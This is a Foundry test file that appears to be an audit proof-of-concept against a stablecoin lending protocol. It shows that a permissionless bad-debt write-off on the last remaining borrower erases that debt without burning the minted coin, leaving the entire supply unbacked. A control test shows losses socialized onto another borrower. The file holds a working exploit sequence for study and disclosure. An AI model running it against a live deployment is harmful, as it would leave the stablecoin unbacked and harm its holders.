// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {Lender, Coin, Vault} from "src/Lender.sol";
import {Factory} from "src/Factory.sol";
import {ERC20 as SolERC20} from "lib/solmate/src/tokens/ERC20.sol";

contract FeedMock {
    uint8 public decimals = 18;
    int256 public price = 1e18;
    function setPrice(int256 p) external { price = p; }
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (0, price, 0, block.timestamp, 0);
    }
}

contract ColMock is SolERC20 {
    constructor() SolERC20("Collateral", "COL", 18) {}
    function mint(address to, uint256 amount) public { _mint(to, amount); }
}

/// @notice PoC: Monolith's bad-debt write-off deletes a borrower's debt WITHOUT burning the Coin minted
///         against it. When the written-off borrower is the last/only debt in the market, the
///         socialization branch is skipped entirely (totalDebt==0 after the debt is removed), so 100% of
///         that Coin becomes permanently unbacked → the stablecoin is under-collateralized (depeg).
contract WriteOffUnbackedCoin is Test {
    Factory factory; Lender lender; Coin coin; Vault vault; ColMock collateral; FeedMock feed;
    address operator = address(0xA11CE);

    function setUp() public {
        vm.warp(1_000_000);
        collateral = new ColMock();
        feed = new FeedMock();
        factory = new Factory(operator, 1e15);
        Factory.DeployParams memory p = Factory.DeployParams({
            name: "MonoUSD", symbol: "MUSD", collateral: address(collateral),
            psmAsset: address(0), psmVault: address(0), feed: address(feed),
            collateralFactor: 5000, minDebt: 1000e18, timeUntilImmutability: 365 days,
            operator: operator, manager: operator, halfLife: 7 days,
            targetFreeDebtRatioStartBps: 2000, targetFreeDebtRatioEndBps: 4000,
            redeemFeeBps: 30, stalenessThreshold: 48 hours, maxBorrowDeltaBps: 200, minTotalSupply: 1
        });
        (address l, address c, address v) = factory.deploy(p);
        lender = Lender(l); coin = Coin(c); vault = Vault(payable(v));
    }

    function _open(address u, uint256 borrow, bool redeemable) internal {
        uint256 coll = borrow * 2 + 1e18;
        collateral.mint(u, coll);
        vm.startPrank(u);
        collateral.approve(address(lender), coll);
        lender.adjust(u, int256(coll), int256(borrow), redeemable);
        vm.stopPrank();
    }

    function _backing() internal view returns (uint256) {
        return lender.totalFreeDebt() + lender.totalPaidDebt();
    }

    // ─────────────────────────────────────────────────────────────────────────────────────────
    // L1 ENTRY: permissionless. L2 STATE FLIP: backing → 0 while coin supply stays. L3 OUTCOME:
    // every Coin in the market is now unbacked.
    // ─────────────────────────────────────────────────────────────────────────────────────────
    function test_lastBorrower_writeOff_leaves_coin_unbacked() public {
        address alice = makeAddr("alice");      // the (only) borrower
        address keeper = makeAddr("keeper");    // permissionless write-off caller (any EOA)

        _open(alice, 50_000e18, false);         // borrow 50k MUSD against 100k+ collateral (50% LTV)

        assertEq(coin.totalSupply(), 50_000e18, "L2 pre: 50k coin minted");
        assertEq(_backing(), 50_000e18, "L2 pre: fully backed by debt");

        // Collateral crashes 99.5% (volatile asset / depeg). Position becomes deep bad debt.
        feed.setPrice(0.005e18);

        // Sanity: debt now exceeds 100x the collateral value → write-off condition holds.
        // (collateral ~100,001e18 * 0.005 = ~500 USD value; debt 50,000 > 500*100 = 50,000)
        feed.setPrice(0.004e18); // ensure strictly > 100x

        // L1: ANY address triggers the permissionless write-off.
        vm.prank(keeper);
        bool wrote = lender.writeOff(alice, keeper);
        assertTrue(wrote, "write-off executed");

        // L2 STATE FLIP: the borrower's entire debt is gone, but the Coin was never burned.
        assertEq(lender.getDebtOf(alice), 0, "alice owes nothing");
        assertEq(_backing(), 0, "L2: total debt backing is now ZERO");
        assertEq(coin.totalSupply(), 50_000e18, "L2: but 50k coin still circulates");

        // L3 OUTCOME: 100% of the circulating stablecoin is unbacked.
        uint256 unbacked = coin.totalSupply() - _backing();
        console2.log("UNBACKED coin (wei):", unbacked);
        assertEq(unbacked, 50_000e18, "L3: entire supply unbacked -> insolvent / depeg");
        // Alice keeps the 50k MUSD she borrowed, owes nothing.
        assertEq(coin.balanceOf(alice), 50_000e18, "L3: borrower kept the full borrowed amount, debt-free");
    }

    // Control: WITH another solvent borrower, the socialization branch DOES run and preserves backing
    // (the loss is pushed onto the survivor). This bounds the finding to the last/only-borrower case.
    function test_control_otherBorrower_absorbs_via_socialization() public {
        address alice = makeAddr("alice"); // becomes bad debt
        address bob = makeAddr("bob");     // solvent survivor
        address keeper = makeAddr("keeper");

        _open(alice, 50_000e18, false);
        _open(bob, 50_000e18, false);
        assertEq(coin.totalSupply(), 100_000e18);
        assertEq(_backing(), 100_000e18);

        feed.setPrice(0.004e18); // alice deep underwater (>100x); bob also underwater but not written off here

        uint256 bobDebtBefore = lender.getDebtOf(bob);
        vm.prank(keeper);
        lender.writeOff(alice, keeper);

        // backing preserved: alice's debt was socialized onto bob (his debt rose), coin still backed.
        uint256 bobDebtAfter = lender.getDebtOf(bob);
        console2.log("bob debt before:", bobDebtBefore);
        console2.log("bob debt after :", bobDebtAfter);
        console2.log("coin supply    :", coin.totalSupply());
        console2.log("backing        :", _backing());
        assertGt(bobDebtAfter, bobDebtBefore, "survivor absorbed the bad debt");
        assertApproxEqAbs(coin.totalSupply(), _backing(), 10, "backing preserved when a survivor exists");
    }
}
